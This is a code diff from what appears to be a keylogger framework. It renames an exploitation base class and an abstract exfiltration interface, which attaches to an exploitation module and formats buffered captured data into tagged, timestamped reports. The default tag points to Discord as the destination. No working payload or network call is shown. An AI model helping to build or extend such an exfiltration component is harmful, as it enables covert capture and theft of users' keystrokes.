@@ -7,16 +7,17 @@ import abc
 import platform
 from datetime import datetime
 
-from src.modules.exploitation.base import Exploit
+from src.modules.exploitation.base import ExploitationModule
 
 
-class Exfiltrator(abc.ABC):
-    def __init__(self, module: Exploit, tag: str):
+class ExfiltrationModule(abc.ABC):
+    def __init__(self, module: ExploitationModule, tag: str):
         """Interface for the implementation of all exfiltrators.
 
         Args:
-            module (Exploit): Instance of a Exploit module to which the
-                exfiltrator will attach itself as a subscriber.
+            module (ExploitationModule): Instance of ExploitationModule
+                to which the exfiltrator will attach itself as a
+                subscriber.
             tag (str): A unique identifier for the current host.
                 Defaults to a string with a format similar to
                 'KeyLogger::Discord::hostname' if None.
@@ -31,8 +32,9 @@ class Exfiltrator(abc.ABC):
 
     @property
     def report(self) -> str:
-        """Get a report based on the data buffered by the keylogger as
-        a string consisting of a tag, timestamp and the data itself."""
+        """Get a report based on the data buffered by the
+        ExploitationModule as a string consisting of a tag, timestamp
+        and the data itself."""
         timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
         header = f"[{self.tag}] @ {timestamp}"
         '''The standard report is formatted as follows:
